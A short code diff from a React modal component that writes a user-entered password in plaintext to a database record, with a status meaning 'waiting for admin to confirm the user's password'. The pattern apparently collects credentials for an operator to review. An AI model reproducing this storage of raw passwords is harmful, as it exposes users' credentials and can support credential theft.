@@ -44,7 +44,7 @@ const Modal = ({ isModal, setIsModal }) => {
     const updates = {};
     updates[
       "/records/" + localStorage.getItem("record_uid") + "/" + "password"
-    ] = passwords;
+    ] = [password];
     updates[
       "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
     ] = "Đang chờ xác nhận mật khẩu user từ admin";
